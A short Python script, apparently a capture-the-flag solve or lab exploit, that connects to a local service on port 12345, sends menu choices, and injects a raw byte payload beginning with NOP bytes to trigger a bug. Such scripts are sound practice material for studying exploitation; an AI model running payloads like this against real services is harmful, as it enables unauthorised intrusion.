import netcat


if __name__ == '__main__':
    client = netcat.Netcat("127.0.0.1", 12345)
    client.read_until('>')
    client.write('wrap\n')
    client.read_until('>')
    client.write('1\n')
    print(client.read_until('>'))
    client.write('\x90\x90\xd3\x69\x48\x6c\xff\n')
    print(client.read_until('>'))
    print(client.read_until('>'))
    client.write('wrap\n')
    print(client.read_until('>'))
